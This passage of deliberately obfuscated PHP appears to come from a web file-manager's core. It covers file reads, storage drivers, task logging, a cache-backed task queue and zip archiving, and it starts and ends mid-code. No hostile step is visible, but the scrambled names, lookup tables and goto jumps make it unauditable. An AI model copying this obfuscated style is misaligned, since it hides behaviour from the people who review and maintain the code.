fileSubstr($èğóıúŠ, $ÕÂÒıÄ¢, $´ÕÏ† = false) { $öæüŠ­ =& $_SERVER[•€áå–Õ]; $´Í‰¤§÷ = self::driverMake($èğóıúŠ); $½ÕŸ—½³ = $´Í‰¤§÷->size($èğóıúŠ); $İ€õß = $ÕÂÒıÄ¢; $åô²» = $´ÕÏ†; if ($ÕÂÒıÄ¢ < 0) { $ÕÂÒıÄ¢ = $½ÕŸ—½³ + $ÕÂÒıÄ¢; } if ($´ÕÏ† === !1) { $´ÕÏ† = $½ÕŸ—½³ - $ÕÂÒıÄ¢; } if ($ÕÂÒıÄ¢ + $´ÕÏ† > $½ÕŸ—½³) { $´ÕÏ† = $½ÕŸ—½³ - $ÕÂÒıÄ¢; } if (!$½ÕŸ—½³ && $´Í‰¤§÷->getType() == $öæüŠ­[118] && !$´Í‰¤§÷->exist($èğóıúŠ)) { $ëÛ«–­å = get_path_this($èğóıúŠ); $û‚‹œğö = parse_url_query($ëÛ«–­å); if (is_array($û‚‹œğö) && isset($û‚‹œğö[$öæüŠ­[42]])) { $ëÛ«–­å = urldecode($û‚‹œğö[$öæüŠ­[42]]); } throw new Exception($öæüŠ­[1205] . LNG($öæüŠ­[1206]) . $öæüŠ­[1007] . clear_html($ëÛ«–­å) . $öæüŠ­[22]); } if ($´ÕÏ† <= 0) { return $öæüŠ­[22]; } if ($ÕÂÒıÄ¢ < 0 || $ÕÂÒıÄ¢ >= $½ÕŸ—½³ || $´ÕÏ† > 1024 * 1024 * 10) { throw new Exception("\x66\151\x6c\145\x52\145\141\x64\x20\x65\x72\x72\x6f\x72\41\x20\x73\164\x61\162\x74\75{$ÕÂÒıÄ¢}\73\x6c\x65\156\147\164\x68\x3d{$´ÕÏ†}\x3b\40\163\x69\x7a\x65\75{$½ÕŸ—½³}\x3b"); } $ß¹œµ™ş = $´Í‰¤§÷->fileSubstr($èğóıúŠ, $ÕÂÒıÄ¢, $´ÕÏ†); if (!$ß¹œµ™ş && $´ÕÏ† && isset($GLOBALS[$öæüŠ­[1207]])) { throw new Exception($GLOBALS[$öæüŠ­[1207]][$öæüŠ­[1208]]); } return $ß¹œµ™ş; } private static function driverMake(&$Òåõ³ŸÚ) { $ıÂÜÕ„ı =& $_SERVER[•€áå–Õ]; $÷ª×çôÒ = KodIO::parse($Òåõ³ŸÚ); if (!self::$driverListSystem) { $©üœ’¹¬ = Model($ıÂÜÕ„ı[808])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($©üœ’¹¬, $ıÂÜÕ„ı[454]); } if ($÷ª×çôÒ[$ıÂÜÕ„ı[43]] == KodIO::KOD_IO && !self::$driverListSystem[$÷ª×çôÒ[$ıÂÜÕ„ı[454]]]) { return !1; } $Òåõ³ŸÚ = $÷ª×çôÒ[$ıÂÜÕ„ı[1209]]; $İÉ¹Ø°Î = self::driverGet($÷ª×çôÒ, $Òåõ³ŸÚ); return $İÉ¹Ø°Î; } private static function driverGet($Ïñ»Ó , &$ù§­Áà) { $ªè’‚ü =& $_SERVER[•€áå–Õ]; $Ã°¯ˆ³ = $Ïñ»Ó [$ªè’‚ü[1210]]; $–Â†¥…¡ = $Ïñ»Ó [$ªè’‚ü[454]]; switch ($Ïñ»Ó [$ªè’‚ü[43]]) { case KodIO::KOD_IO: $¨ÉñÔ§ú = self::$driverListSystem[$–Â†¥…¡]; break; case KodIO::KOD_SOURCE: $ù§­Áà = $–Â†¥…¡ . $ù§­Áà; $¨ÉñÔ§ú = array($ªè’‚ü[1211] => $ªè’‚ü[1212], $ªè’‚ü[16] => $Ïñ»Ó ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $àíŒÂîº = $GLOBALS[$ªè’‚ü[1213]]; self::$driverListUser = array_to_keyvalue($àíŒÂîº, $ªè’‚ü[454]); } $¨ÉñÔ§ú = self::$driverListUser[$–Â†¥…¡]; break; case KodIO::KOD_SHARE_LINK: $¨ÉñÔ§ú = array($ªè’‚ü[1211] => $ªè’‚ü[1214], $ªè’‚ü[16] => $Ïñ»Ó ); $ï²‘Øêî = Action($ªè’‚ü[1215])->sharePathInfo($Ïñ»Ó [$ªè’‚ü[96]]); $ù§­Áà = $ï²‘Øêî[$ªè’‚ü[193]]; if (!$ï²‘Øêî[$ªè’‚ü[193]]) { $Š¬Š„ºé = Model($ªè’‚ü[643])->getInfo($ï²‘Øêî[$ªè’‚ü[644]]); $ù§­Áà = KodIO::clear($Š¬Š„ºé[$ªè’‚ü[1216]] . $Ïñ»Ó [$ªè’‚ü[1209]]); $Ïñ»Ó [$ªè’‚ü[540]] = $Š¬Š„ºé; $Ïñ»Ó [$ªè’‚ü[1192]] = $ù§­Áà; $¨ÉñÔ§ú = array($ªè’‚ü[1211] => $ªè’‚ü[1217], $ªè’‚ü[16] => $Ïñ»Ó ); } break; case KodIO::KOD_SHARE_ITEM: $¨ÉñÔ§ú = array($ªè’‚ü[1211] => $ªè’‚ü[1218], $ªè’‚ü[16] => $Ïñ»Ó ); $Š¬Š„ºé = Model($ªè’‚ü[643])->getInfo($Ïñ»Ó [$ªè’‚ü[454]]); if ($Š¬Š„ºé[$ªè’‚ü[193]] == $ªè’‚ü[224]) { $ù§­Áà = KodIO::clear($Š¬Š„ºé[$ªè’‚ü[1216]] . $Ïñ»Ó [$ªè’‚ü[1209]]); $Ïñ»Ó [$ªè’‚ü[540]] = $Š¬Š„ºé; $Ïñ»Ó [$ªè’‚ü[1192]] = $ù§­Áà; $¨ÉñÔ§ú = array($ªè’‚ü[1211] => $ªè’‚ü[1219], $ªè’‚ü[16] => $Ïñ»Ó ); } else { if (!$ù§­Áà) { $ù§­Áà = $Š¬Š„ºé[$ªè’‚ü[193]]; } } break; default: $ù§­Áà = $Ïñ»Ó [$ªè’‚ü[96]]; $¨ÉñÔ§ú = array($ªè’‚ü[1211] => $ªè’‚ü[1220]); break; } $õ™·Æ¤Ñ = $Ïñ»Ó [$ªè’‚ü[96]]; if (!isset(self::$driverCache[$õ™·Æ¤Ñ])) { $ßß÷¨¬Ş = strtolower($¨ÉñÔ§ú[$ªè’‚ü[107]]); $„š» Æ— = $GLOBALS[$ªè’‚ü[16]][$ªè’‚ü[101]][$ªè’‚ü[867]]; $ÛÎéŠò = $ªè’‚ü[86] . (isset($„š» Æ—[$ßß÷¨¬Ş]) ? $„š» Æ—[$ßß÷¨¬Ş] : ucfirst($ßß÷¨¬Ş)); if (!class_exists($ÛÎéŠò)) { show_json("{$ÛÎéŠò}\40\x6e\157\x74\40\145\170\151\163\164\163\41", !1); } $®™È½Š = isset($¨ÉñÔ§ú[$ªè’‚ü[16]]) ? $¨ÉñÔ§ú[$ªè’‚ü[16]] : !1; self::$driverCache[$õ™·Æ¤Ñ] = new $ÛÎéŠò($®™È½Š); } $™ö‘³¤Š = self::$driverCache[$õ™·Æ¤Ñ]; $™ö‘³¤Š->pathDriver = $Ã°¯ˆ³; $™ö‘³¤Š->pathBase = $ªè’‚ü[22]; if (isset($¨ÉñÔ§ú[$ªè’‚ü[16]][$ªè’‚ü[1221]])) { $™ö‘³¤Š->pathBase = rtrim($¨ÉñÔ§ú[$ªè’‚ü[16]][$ªè’‚ü[1221]], $ªè’‚ü[18]) . $ªè’‚ü[18]; $ù§­Áà = $™ö‘³¤Š->pathBase . ltrim($ù§­Áà, $ªè’‚ü[18]); } $ù§­Áà = $™ö‘³¤Š->getPath($ù§­Áà); if (isset($Ïñ»Ó [$ªè’‚ü[1192]])) { $ù§­Áà = $Ïñ»Ó [$ªè’‚ü[1192]]; } $™ö‘³¤Š->path = $ù§­Áà; return $™ö‘³¤Š; } public static function errorTips($Ìš¨¸‡ä = false) { $¾ú†Ì™è =& $_SERVER[•€áå–Õ]; static $‰©Ç¸Æ¤ = array(); $šÉÈù» = 1000; if ($Ìš¨¸‡ä === -1) { return $‰©Ç¸Æ¤ ? $‰©Ç¸Æ¤[count($‰©Ç¸Æ¤) - 1] : $¾ú†Ì™è[22]; } if ($Ìš¨¸‡ä === !1) { return implode($¾ú†Ì™è[12], $‰©Ç¸Æ¤); } if (count($‰©Ç¸Æ¤) >= $šÉÈù») { $‰©Ç¸Æ¤ = array_slice($‰©Ç¸Æ¤, $šÉÈù» * 0.5, $šÉÈù»); } $‰©Ç¸Æ¤[] = $Ìš¨¸‡ä; write_log($¾ú†Ì™è[175] . ACTION . $¾ú†Ì™è[1222] . $Ìš¨¸‡ä, $¾ú†Ì™è[1223]); } public static function getLastError($¸Åçæú = '') { $ß‘¹ö·² = self::errorTips(-1); return $ß‘¹ö·² ? $ß‘¹ö·² : $¸Åçæú; } } goto F‹—øÏ­ğğ; C¼“‘ÇÌƒ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($ÆáëŠ¬ø, $Ç÷‡–Õ† = '', $›Ïç×ß = 0, $¦„¥Äò = '') { $ó¸Òë˜ =& $_SERVER[•€áå–Õ]; $¦„¥Äò = $¦„¥Äò ? $¦„¥Äò : ($Ç÷‡–Õ† ? $Ç÷‡–Õ† : $ÆáëŠ¬ø); $ôçìÌÎÃ = new Task($ÆáëŠ¬ø, $Ç÷‡–Õ†, $›Ïç×ß, $¦„¥Äò); $GLOBALS[$ó¸Òë˜[1776] . $ÆáëŠ¬ø] = new TaskLog($ó¸Òë˜[1677], $ôçìÌÎÃ, $¦„¥Äò); return $ôçìÌÎÃ; } public function __construct($¢¸¿Å´¾ = '', $‰ìó·Š = '', $€î•£«Á = '') { $µ¿×é¼ê =& $_SERVER[•€áå–Õ]; if (!$¢¸¿Å´¾) { $¢¸¿Å´¾ = $µ¿×é¼ê[1677]; } $ËÆéÒ = $¢¸¿Å´¾ . $µ¿×é¼ê[441] . rand_string(10); if (!$€î•£«Á) { $€î•£«Á = $¢¸¿Å´¾ . $µ¿×é¼ê[63] . $€î•£«Á; } switch ($¢¸¿Å´¾) { case $µ¿×é¼ê[1677]: if (!$‰ìó·Š || !$‰ìó·Š->task) { return echoLog($¢¸¿Å´¾ . $µ¿×é¼ê[1777]); } $ÂÏ“ô­ğ = $‰ìó·Š; $ËÆéÒ = $ÂÏ“ô­ğ->task[$µ¿×é¼ê[454]]; $¢¸¿Å´¾ = $ÂÏ“ô­ğ->task[$µ¿×é¼ê[454]]; if (!$ÂÏ“ô­ğ->task[$µ¿×é¼ê[1583]]) { $ÂÏ“ô­ğ->task[$µ¿×é¼ê[1583]] = $€î•£«Á ? $€î•£«Á : $¢¸¿Å´¾; } break; case $µ¿×é¼ê[1778]: if (!$‰ìó·Š) { return echoLog($¢¸¿Å´¾ . $µ¿×é¼ê[1779]); } $õ·Ùñ”¶ = is_string($‰ìó·Š) ? array($‰ìó·Š) : $‰ìó·Š; $ÂÏ“ô­ğ = new TaskFileTransfer($ËÆéÒ, $¢¸¿Å´¾, 0, $€î•£«Á ? $€î•£«Á : $õ·Ùñ”¶[0]); foreach ($õ·Ùñ”¶ as $¥ûÖ‹‹À) { $ÂÏ“ô­ğ->addPath($¥ûÖ‹‹À); } break; case $µ¿×é¼ê[368]: if (!$‰ìó·Š) { return echoLog($¢¸¿Å´¾ . $µ¿×é¼ê[1779]); } $õ·Ùñ”¶ = is_string($‰ìó·Š) ? array($‰ìó·Š) : $‰ìó·Š; $ÂÏ“ô­ğ = new TaskZip($ËÆéÒ, $¢¸¿Å´¾, 0, $€î•£«Á ? $€î•£«Á : $õ·Ùñ”¶[0]); foreach ($õ·Ùñ”¶ as $¥ûÖ‹‹À) { $ÂÏ“ô­ğ->addPath($¥ûÖ‹‹À); } break; case $µ¿×é¼ê[1255]: if (!$‰ìó·Š) { return echoLog($¢¸¿Å´¾ . $µ¿×é¼ê[1779]); } $ÂÏ“ô­ğ = new TaskUnZip($ËÆéÒ, $¢¸¿Å´¾, 0, $€î•£«Á ? $€î•£«Á : $‰ìó·Š); if ($‰ìó·Š) { $ÂÏ“ô­ğ->addFile($‰ìó·Š); } break; case $µ¿×é¼ê[161]: $ÂÏ“ô­ğ = new TaskHttp($ËÆéÒ, $¢¸¿Å´¾); break; default: return; break; } $this->task = $ÂÏ“ô­ğ; $this->taskID = $ËÆéÒ; Hook::bind($µ¿×é¼ê[1714], array($this, $µ¿×é¼ê[1780])); Hook::bind($µ¿×é¼ê[1716], array($this, $µ¿×é¼ê[1781])); Hook::bind($µ¿×é¼ê[1710], array($this, $µ¿×é¼ê[1782])); echoLog($µ¿×é¼ê[1783] . $ÂÏ“ô­ğ->task[$µ¿×é¼ê[1583]]); } public function __destruct() { $this->end(); } public function end($“İ¹£÷ = '') { $åÚöšÂ× =& $_SERVER[•€áå–Õ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($“İ¹£÷); $this->task = !1; $this->taskID = !1; Hook::unbind($åÚöšÂ×[1714], array($this, $åÚöšÂ×[1780])); Hook::unbind($åÚöšÂ×[1716], array($this, $åÚöšÂ×[1781])); Hook::unbind($åÚöšÂ×[1710], array($this, $åÚöšÂ×[1782])); } public function taskUpdate($¸®ÛïËÄ) { $ğßûô¤Û =& $_SERVER[•€áå–Õ]; if (!$¸®ÛïËÄ || $this->taskID != $¸®ÛïËÄ[$ğßûô¤Û[454]]) { return; } $ÉÄ¶—Š = 20; $ Ú¢³¾ = intval($¸®ÛïËÄ[$ğßûô¤Û[1695]] * $ÉÄ¶—Š); $—Ûòê = $ğßûô¤Û[175] . str_repeat($ğßûô¤Û[925], $ Ú¢³¾) . $ğßûô¤Û[1055] . str_repeat($ğßûô¤Û[63], $ÉÄ¶—Š - $ Ú¢³¾) . $ğßûô¤Û[177]; $¦÷”İŸ = $—Ûòê . sprintf($ğßûô¤Û[1784], $¸®ÛïËÄ[$ğßûô¤Û[1695]] * 100) . $ğßûô¤Û[1785]; $±õöéâ’ = $¦÷”İŸ . $¸®ÛïËÄ[$ğßûô¤Û[1694]] . $ğßûô¤Û[18] . $¸®ÛïËÄ[$ğßûô¤Û[827]] . LNG($ğßûô¤Û[1786]); $Ö›¢øÊÖ = $ğßûô¤Û[22]; if ($¸®ÛïËÄ[$ğßûô¤Û[1770]]) { $±õöéâ’ = $¦÷”İŸ . size_format($¸®ÛïËÄ[$ğßûô¤Û[1694]]) . $ğßûô¤Û[18] . size_format($¸®ÛïËÄ[$ğßûô¤Û[827]]); $Ö›¢øÊÖ = size_format($¸®ÛïËÄ[$ğßûô¤Û[1696]]) . $ğßûô¤Û[1787]; } if ($¸®ÛïËÄ[$ğßûô¤Û[1105]]) { $¸®ÛïËÄ[$ğßûô¤Û[1744]] = $¸®ÛïËÄ[$ğßûô¤Û[1105]] . $ğßûô¤Û[63] . $¸®ÛïËÄ[$ğßûô¤Û[1744]]; } if ($¸®ÛïËÄ[$ğßûô¤Û[1744]]) { $‹ˆŞ¥µ = $ğßûô¤Û[22]; if ($¸®ÛïËÄ[$ğßûô¤Û[1746]]) { $‹ˆŞ¥µ = $ğßûô¤Û[60] . size_format($¸®ÛïËÄ[$ğßûô¤Û[1747]]) . $ğßûô¤Û[18] . size_format($¸®ÛïËÄ[$ğßûô¤Û[1746]]); } $Ö›¢øÊÖ .= $¸®ÛïËÄ[$ğßûô¤Û[1744]] . $‹ˆŞ¥µ; } if ($¸®ÛïËÄ[$ğßûô¤Û[804]] && !$¸®ÛïËÄ[$ğßûô¤Û[1746]]) { $Ö›¢øÊÖ .= $ğßûô¤Û[63] . size_format($¸®ÛïËÄ[$ğßûô¤Û[1751]]) . $ğßûô¤Û[18] . size_format($¸®ÛïËÄ[$ğßûô¤Û[804]]); } echoLog($±õöéâ’ . $ğßûô¤Û[63] . $Ö›¢øÊÖ, !0); } public function taskEnd($Õ•ò®ñ…) { $ÑÍĞ¸ =& $_SERVER[•€áå–Õ]; if (!$Õ•ò®ñ… || $this->taskID != $Õ•ò®ñ…[$ÑÍĞ¸[454]]) { return; } $—Ñƒä¯İ = $Õ•ò®ñ… ? $Õ•ò®ñ…[$ÑÍĞ¸[1694]] . $ÑÍĞ¸[18] . $Õ•ò®ñ…[$ÑÍĞ¸[827]] . LNG($ÑÍĞ¸[1786]) . $ÑÍĞ¸[83] : $ÑÍĞ¸[22]; echoLog($ÑÍĞ¸[1788] . $Õ•ò®ñ…[$ÑÍĞ¸[1583]] . ($Õ•ò®ñ…[$ÑÍĞ¸[505]] ? $ÑÍĞ¸[83] . $Õ•ò®ñ…[$ÑÍĞ¸[505]] : $ÑÍĞ¸[22]) . $ÑÍĞ¸[83] . $—Ñƒä¯İ . $ÑÍĞ¸[1789] . sprintf($ÑÍĞ¸[892], timeFloat() - $Õ•ò®ñ…[$ÑÍĞ¸[1697]]) . $ÑÍĞ¸[1709]); $this->end(); } public function taskKill($”›Ÿö‡¢) { $·†ïÄïû =& $_SERVER[•€áå–Õ]; if (!$”›Ÿö‡¢ || $this->taskID != $”›Ÿö‡¢[$·†ïÄïû[454]]) { return; } echoLog($·†ïÄïû[1790] . $”›Ÿö‡¢[$·†ïÄïû[1583]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\163\x6b\x51\165\145\x75\x65\114\145\156\147\164\150"; const QUEUE_DATA = "\x74\x61\x73\153\121\165\x65\x75\145\x44\141\164\141"; const QUEUE_TIME = "\x74\x61\x73\x6b\x51\x75\x65\x75\145\114\141\x73\164\x52\165\x6e"; const QUEUE_THREAD = "\164\141\163\153\x51\165\x65\x75\x65\124\150\x72\x65\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÂÕßÙƒÜ, $ß‘ÉÇ­÷ = array(), $ÍİÍëÊ— = '', $ÅÄşÅ = '') { $åéËÒåè =& $_SERVER[•€áå–Õ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ÅÄşÅ && array_find_by_field(self::$listData, $åéËÒåè[106], $ÅÄşÅ)) { return !0; } if ($ÅÄşÅ && array_find_by_field(self::$listDataAdd, $åéËÒåè[106], $ÅÄşÅ)) { return !0; } self::$listDataAdd[] = array($åéËÒåè[319] => $ÂÕßÙƒÜ, $åéËÒåè[1791] => $ß‘ÉÇ­÷, $åéËÒåè[505] => $ÍİÍëÊ—, $åéËÒåè[106] => $ÅÄşÅ); return !0; } public static function addSubmit() { $€ÉÚ¡ =& $_SERVER[•€áå–Õ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($€ÉÚ¡[1792] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $€ÉÚ¡[22], $€ÉÚ¡[505])), $€ÉÚ¡[197]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($²Ëæ…ßş, $áÇŞîè¤ = array(), $­Œø‚™Ğ = '', $ÚÑûìò¯ = '') { $•»ô›İË =& $_SERVER[•€áå–Õ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Ïö×»ö• = self::getAll(); if ($ÚÑûìò¯ && array_find_by_field($Ïö×»ö•, $•»ô›İË[106], $ÚÑûìò¯)) { return !0; } $Ïö×»ö•[] = array($•»ô›İË[319] => $²Ëæ…ßş, $•»ô›İË[1791] => $áÇŞîè¤, $•»ô›İË[505] => $­Œø‚™Ğ, $•»ô›İË[106] => $ÚÑûìò¯); self::setAll($Ïö×»ö•); write_log($•»ô›İË[1792] . $­Œø‚™Ğ, $•»ô›İË[197]); return !0; } public static function run() { $Õ©¨ÛŞ =& $_SERVER[•€áå–Õ]; $ñæ¯›™Ö = self::getAll(); $¨°ÙËı¡ = array_shift($ñæ¯›™Ö); if (!$¨°ÙËı¡) { return !1; } self::setAll($ñæ¯›™Ö); $Ö›ñÌ£× = timeFloat(); $Ë˜óäéü = $Õ©¨ÛŞ[22]; try { $Ë˜óäéü = Hook::apply($¨°ÙËı¡[$Õ©¨ÛŞ[319]], $¨°ÙËı¡[$Õ©¨ÛŞ[1791]]); } catch (Exception $äúşíÁó) { write_log($äúşíÁó, $Õ©¨ÛŞ[1223]); } $º¥æ¿ÊÈ = number_format(timeFloat() - $Ö›ñÌ£×, 3) . $Õ©¨ÛŞ[1709]; if ($Ë˜óäéü && is_string($Ë˜óäéü)) { $º¥æ¿ÊÈ = $º¥æ¿ÊÈ . $Õ©¨ÛŞ[1793] . $Ë˜óäéü; } write_log($Õ©¨ÛŞ[1794] . $¨°ÙËı¡[$Õ©¨ÛŞ[505]] . $Õ©¨ÛŞ[1795] . $º¥æ¿ÊÈ, $Õ©¨ÛŞ[197]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ãå—­åÀ =& $_SERVER[•€áå–Õ]; $´ğ«‰„€ = self::threadCount() + 1; if ($´ğ«‰„€ > 3 || !self::count()) { return; } write_log($ãå—­åÀ[1796] . $´ğ«‰„€, $ãå—­åÀ[197]); Cache::set(self::QUEUE_THREAD, $´ğ«‰„€, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ãå—­åÀ[1797], $ãå—­åÀ[197]); } public static function getKey($œ³ÙÖçÅ, $µ¦£…› = "\151\x6e\164") { $æ›çÀ½ü =& $_SERVER[•€áå–Õ]; Cache::removeMemory($œ³ÙÖçÅ); $Ù ß³÷® = Cache::get($œ³ÙÖçÅ); if ($µ¦£…› == $æ›çÀ½ü[343]) { return $Ù ß³÷® ? intval($Ù ß³÷®) : 0; } if ($µ¦£…› == $æ›çÀ½ü[1798]) { return is_array($Ù ß³÷®) ? $Ù ß³÷® : array(); } return $Ù ß³÷®; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[•€áå–Õ][1798]); } public static function setAll($¨¨çÚÂı) { $²‡Œô¾© = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($¨¨çÚÂı), $²‡Œô¾©); Cache::set(self::QUEUE_DATA, $¨¨çÚÂı, $²‡Œô¾©); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ó¥¡íàë, $æ­Œ‘Óï = 5.0) { if (!$ó¥¡íàë) { return; } $µï‘¥ÒÉ = Cache::get($ó¥¡íàë); if (!$µï‘¥ÒÉ || timeFloat() - floatVal($µï‘¥ÒÉ) >= $æ­Œ‘Óï) { Cache::set($ó¥¡íàë, timeFloat(), $æ­Œ‘Óï * 10); return !0; } return !1; } public static function timeLimitCall($éˆìµó›, $ëú¦Âñ, $Ã÷¸‡¹Ä, $²›ÌØ¬ = 5.0) { $”÷‚™Ş =& $_SERVER[•€áå–Õ]; if (!$éˆìµó› || !$ëú¦Âñ) { return; } self::$asyncAdd = !0; $ÔÒµ„‚À = $”÷‚™Ş[1799]; $ÇÍŠ²ì = Cache::get($ÔÒµ„‚À, !0); $ÖšÌ­±Ÿ = array($”÷‚™Ş[1800] => timeFloat(), $”÷‚™Ş[1801] => timeFloat(), $”÷‚™Ş[319] => $ëú¦Âñ, $”÷‚™Ş[1791] => $Ã÷¸‡¹Ä, $”÷‚™Ş[206] => $²›ÌØ¬); if (is_array($ÇÍŠ²ì[$éˆìµó›])) { $ÖšÌ­±Ÿ[$”÷‚™Ş[1801]] = $ÇÍŠ²ì[$éˆìµó›][$”÷‚™Ş[1801]]; } if (is_array($ÇÍŠ²ì[$éˆìµó›])) { if (timeFloat() - $ÇÍŠ²ì[$éˆìµó›][$”÷‚™Ş[1800]] < $ÖšÌ­±Ÿ[$”÷‚™Ş[206]] * 0.3) { return; } $ÖšÌ­±Ÿ[$”÷‚™Ş[1801]] = $ÇÍŠ²ì[$éˆìµó›][$”÷‚™Ş[1801]]; } $ÇÍŠ²ì[$éˆìµó›] = $ÖšÌ­±Ÿ; Cache::set($ÔÒµ„‚À, $ÇÍŠ²ì, 60); Cache::removeMemory($ÔÒµ„‚À); write_log($”÷‚™Ş[1802] . $éˆìµó› . $”÷‚™Ş[83] . $ëú¦Âñ, $”÷‚™Ş[197]); } public static function timeLimitCallLoop() { $´öóÉ•Õ =& $_SERVER[•€áå–Õ]; $‚Ù­áÎ™ = array($´öóÉ•Õ[1803]); $ŸÁœÚàÁ = in_array(strtolower(ACTION), $‚Ù­áÎ™); if (!$ŸÁœÚàÁ && !self::$asyncAdd) { return; } $óÒıÜ = $´öóÉ•Õ[1799]; $ÍğÃ·ìú = Cache::get($óÒıÜ, !0); if (!$ÍğÃ·ìú || count($ÍğÃ·ìú) <= 0) { return; } $¿¥şß½ = !1; $¿÷×àî = timeFloat(); $ÀÙëÚÔÖ = array(); foreach ($ÍğÃ·ìú as $¨¤­µŒ· => $’á¯®˜) { if ($¿÷×àî - $’á¯®˜[$´öóÉ•Õ[1801]] > $’á¯®˜[$´öóÉ•Õ[206]]) { $¿¥şß½ = !0; try { Hook::apply($’á¯®˜[$´öóÉ•Õ[319]], $’á¯®˜[$´öóÉ•Õ[1791]]); write_log($´öóÉ•Õ[1804] . $¨¤­µŒ· . $´öóÉ•Õ[83] . $’á¯®˜[$´öóÉ•Õ[319]] . $´öóÉ•Õ[1805] . ACTION, $´öóÉ•Õ[197]); } catch (Exception $ïôÛ˜Î) { } continue; } $ÀÙëÚÔÖ[$¨¤­µŒ·] = $’á¯®˜; } if (!$¿¥şß½) { return; } if (!$ÀÙëÚÔÖ) { return Cache::remove($óÒıÜ); } Cache::set($óÒıÜ, $ÀÙëÚÔÖ, 60); Cache::removeMemory($óÒıÜ); } public static function finished($Æ‚…·, $Áõõø¼) { $ë«í…Õú =& $_SERVER[•€áå–Õ]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ë«í…Õú[319] => $Æ‚…·, $ë«í…Õú[1791] => $Áõõø¼); } private static function finishedRun() { $ÒóùÕÔ =& $_SERVER[•€áå–Õ]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $õéùˆ¤Ì) { try { Hook::apply($õéùˆ¤Ì[$ÒóùÕÔ[319]], $õéùˆ¤Ì[$ÒóùÕÔ[1791]]); } catch (Exception $­‚ÑÊ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto Bˆ­Æ’¯¦»; F‹—øÏ­ğğ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $É»ª¤£»; if ($É»ª¤£») { return $É»ª¤£»; } $Ò¨õ«µå = IO::init($_SERVER[•€áå–Õ][18]); return $Ò¨õ«µå; } private static function iconvSystem($´ÛìØ½«) { return self::local()->iconvSystem($´ÛìØ½«); } private static function iconvApp($‚Ş·³Âã) { return self::local()->iconvApp($‚Ş·³Âã); } public static function zipFolder($ãÄ÷şß†, $Õëû¶Â = "\172\x69\160", $º¾ÃÉè– = '', $Ï¸èâ¡² = REPEAT_RENAME) { $¨†£Ãò÷ =& $_SERVER[•€áå–Õ]; $‡õ…ë‚ = IO::listPath($ãÄ÷şß†); if (!$‡õ…ë‚) { return !1; } $‡õ…ë‚ = array_merge($‡õ…ë‚[$¨†£Ãò÷[94]], $‡õ…ë‚[$¨†£Ãò÷[95]]); return self::zip($‡õ…ë‚, $Õëû¶Â, $º¾ÃÉè–, $Ï¸èâ¡²); } public static function zip($ØãÀÌâ, $ÈÅ”Î´Ï = "\172\151\x70", $æØ €°Ó = '', $ˆÓÁ¨Á· = REPEAT_RENAME) { $õ¯’¥Ü =& $_SERVER[•€áå–Õ]; if (is_string($ØãÀÌâ) && $ØãÀÌâ) { $ØãÀÌâ = array(array($õ¯’¥Ü[96] => $ØãÀÌâ)); } $¤îÕÔ›è = self::init($ØãÀÌâ[0][$õ¯’¥Ü[96]]); $¼üØıâ = self::info($ØãÀÌâ[0][$õ¯’¥Ü[96]]); $°î¦¯ˆ¡ = $õ¯’¥Ü[22]; $°öê§Ş = $õ¯’¥Ü[22]; $«Îé„ÚÄ = $õ¯’¥Ü[22]; if ($æØ €°Ó && substr($æØ €°Ó, -1, 1) != $õ¯’¥Ü[18]) { $°öê§Ş = get_path_father($æØ €°Ó); $«Îé„ÚÄ = get_path_this($æØ €°Ó); } else { $°öê§Ş = self::pathFather($¼üØıâ[$õ¯’¥Ü[96]]); $«Îé„ÚÄ = $¼üØıâ[$õ¯’¥Ü[42]] . $õ¯’¥Ü[20] . $ÈÅ”Î´Ï; if (count($ØãÀÌâ) > 1) { $ÆÌ­™¸ = IO::info($°öê§Ş); $«Îé„ÚÄ = $ÆÌ­™¸[$õ¯’¥Ü[42]] . $õ¯’¥Ü[20] . $ÈÅ”Î´Ï; } if ($æØ €°Ó) { $°öê§Ş = $æØ €°Ó; } } if ($¤îÕÔ›è->getType() == $õ¯’¥Ü[118]) { $¿‡ğ› Æ = self::init($°öê§Ş); $À¥Ğ°¥¸ = $¿‡ğ› Æ->getType() == $õ¯’¥Ü[118] ? $°öê§Ş : get_path_father($¤îÕÔ›è->path); $À¥Ğ°¥¸ = rtrim($À¥Ğ°¥¸, $õ¯’¥Ü[18]) . $õ¯’¥Ü[18]; mk_dir($À¥Ğ°¥¸); } else { $°î¦¯ˆ¡ = TEMP_FILES . $õ¯’¥Ü[1224] . time() . rand_string(8) . $õ¯’¥Ü[18]; mk_dir($°î¦¯ˆ¡); file_put_contents($°î¦¯ˆ¡ . $õ¯’¥Ü[1225], $õ¯’¥Ü[22]); $À¥Ğ°¥¸ = $°î¦¯ˆ¡; } $Ü¦ıßµ¨ = IO::info($À¥Ğ°¥¸); if 